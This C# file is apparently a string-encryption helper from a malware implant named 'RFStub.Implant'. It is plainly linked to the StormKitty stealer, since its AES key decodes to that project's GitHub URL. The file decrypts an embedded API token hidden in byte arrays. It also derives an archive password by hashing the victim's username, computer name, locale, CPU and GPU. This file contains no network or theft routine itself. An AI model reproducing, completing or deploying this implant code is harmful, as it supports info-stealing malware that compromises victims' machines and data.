using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace RFStub.Implant;

internal sealed class StringsCrypt
{
	public static string ArchivePassword = GenerateRandomData();

	private static readonly byte[] saltBytes = new byte[16]
	{
		255, 64, 191, 111, 23, 3, 113, 119, 231, 121,
		252, 112, 79, 32, 114, 156
	};

	private static readonly byte[] cryptKey = new byte[38]
	{
		104, 116, 116, 112, 115, 58, 47, 47, 103, 105,
		116, 104, 117, 98, 46, 99, 111, 109, 47, 76,
		105, 109, 101, 114, 66, 111, 121, 47, 83, 116,
		111, 114, 109, 75, 105, 116, 116, 121
	};

	public static string github = Encoding.UTF8.GetString(cryptKey);

	public static string AnonApiToken = Decrypt(new byte[32]
	{
		169, 182, 79, 179, 252, 54, 138, 148, 167, 99,
		216, 216, 199, 219, 10, 249, 131, 166, 170, 145,
		237, 248, 142, 78, 196, 137, 101, 62, 142, 107,
		245, 134
	});

	public static string GenerateRandomData(string sd = "0")
	{
		string text = ((!(sd == "0")) ? sd : new Random().Next(0, 10).ToString());
		string s = text + "-" + SystemInfo.username + "-" + SystemInfo.compname + "-" + SystemInfo.culture + "-" + SystemInfo.GetCPUName() + "-" + SystemInfo.GetGPUName();
		using MD5 mD = MD5.Create();
		return string.Join("", mD.ComputeHash(Encoding.UTF8.GetBytes(s)).Select(delegate(byte ba)
		{
			byte b = ba;
			return b.ToString("x2");
		}));
	}

	public static string Decrypt(byte[] bytesToBeDecrypted)
	{
		byte[] bytes = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			bytes = memoryStream.ToArray();
		}
		return Encoding.UTF8.GetString(bytes);
	}

	public static string DecryptConfig(string value)
	{
		if (string.IsNullOrEmpty(value))
		{
			return "";
		}
		if (!value.StartsWith("ENCRYPTED:"))
		{
			return value;
		}
		return Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
	}
}
